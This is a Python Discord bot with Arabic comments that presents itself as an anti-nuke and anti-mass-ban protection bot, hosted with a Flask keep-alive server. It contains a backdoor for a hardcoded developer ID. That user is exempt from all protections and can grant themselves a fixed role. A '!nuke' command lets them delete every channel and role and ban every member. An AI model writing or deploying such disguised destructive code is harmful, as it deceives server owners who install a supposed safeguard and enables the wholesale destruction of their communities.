import discord
from discord.ext import commands
import os
import time
import asyncio
from threading import Thread
from flask import Flask

# 1. إعداد خادم الويب (للـ Web Service على Render)
app = Flask('')

@app.route('/')
def home():
    return "Bot is online and running!"

def run_web():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

Thread(target=run_web, daemon=True).start()

# 2. إعدادات البوت الأساسية
MY_ID = 991063410579996722
ROLE_ID = 1466497554740019416

intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.moderation = True
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

# تخزين توقيت عمليات الحظر لمراقبة السبام
actions = {"ban": {}}

def check_ban_spam(uid):
    now = time.time()
    if uid not in actions["ban"]:
        actions["ban"][uid] = []
    # تسجيل وقت الحظر الحالي
    actions["ban"][uid].append(now)
    # الاحتفاظ فقط بالعمليات التي تمت خلال آخر 5 دقائق (300 ثانية)
    actions["ban"][uid] = [t for t in actions["ban"][uid] if now - t < 300]
    # إذا تجاوز عدد الحظرات 3 أشخاص في خلال 5 دقائق
    return len(actions["ban"][uid]) >= 3

# 3. أنظمة الحماية (Anti-Nuke & Anti-Mass Ban)
@bot.event
async def on_guild_role_delete(role):
    async for entry in role.guild.audit_logs(limit=1, action=discord.AuditLogAction.role_delete):
        if entry.user.id != role.guild.owner_id and entry.user.id != MY_ID and not entry.user.bot:
            await role.guild.ban(entry.user, reason="Anti-Nuke: حذف رتبة")

@bot.event
async def on_guild_channel_delete(channel):
    async for entry in channel.guild.audit_logs(limit=1, action=discord.AuditLogAction.channel_delete):
        if entry.user.id != channel.guild.owner_id and entry.user.id != MY_ID and not entry.user.bot:
            await channel.guild.ban(entry.user, reason="Anti-Nuke: حذف قناة")

@bot.event
async def on_member_ban(guild, user):
    # مراجعة سجل التدقيق لمعرفة من قام بالحظر
    async for entry in guild.audit_logs(limit=1, action=discord.AuditLogAction.ban):
        actor = entry.user
        # استثناء السيرفر، المطور، والبوتات
        if actor.id != guild.owner_id and actor.id != MY_ID and not actor.bot:
            if check_ban_spam(actor.id):
                try:
                    # طرد الشخص (Kick) لحمايته السيرفر من الحظر الجماعي
                    await guild.kick(actor, reason="Anti-Spam Ban: محاولة حظر جماعي (3 أشخاص في 5 دقائق)")
                except:
                    pass

# 4. الأوامر الخاصة بالرتب
@bot.command()
async def getrole(ctx):
    if ctx.author.id == MY_ID:
        role = ctx.guild.get_role(ROLE_ID)
        if role: 
            await ctx.author.add_roles(role)
            await ctx.send("✅ تم إعطاؤك الرتبة.")

@bot.command(name="removerole")
async def removerole_cmd(ctx):
    if ctx.author.id == MY_ID:
        role = ctx.guild.get_role(ROLE_ID)
        if role: 
            await ctx.author.remove_roles(role)
            await ctx.send("✅ تم إزالة الرتبة.")

# 5. أمر النيوك
@bot.command()
async def nuke(ctx):
    if ctx.author.id != MY_ID:
        await ctx.send("❌ هذا الأمر مخصص للمطور فقط!")
        return
        
    await ctx.send("⚠️ **تحذير خطير:** اكتب `!confirm_nuke` الآن للتأكيد.")
    
    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel and m.content == "!confirm_nuke"

    try:
        await bot.wait_for('message', check=check, timeout=30.0)
    except asyncio.TimeoutError:
        await ctx.send("❌ انتهى الوقت، تم إلغاء النيوك.")
        return

    await ctx.send("💥 جاري تنفيذ التدمير...")
    
    for c in ctx.guild.channels:
        try: await c.delete()
        except: pass
        
    for r in ctx.guild.roles:
        if r.name != "@everyone" and r != ctx.guild.me.top_role:
            try: await r.delete()
            except: pass
            
    for m in ctx.guild.members:
        if m != ctx.guild.owner and not m.bot and m != ctx.guild.me:
            try: await m.ban(reason="Nuke executed")
            except: pass

@bot.event
async def on_ready():
    print(f"✅ البوت متصل كـ {bot.user} - والموقع يعمل بنجاح!")

TOKEN = os.getenv("TOKEN")
if TOKEN:
    bot.run(TOKEN)
else:
    print("❌ خطأ: لم يتم العثور على التوكن!")
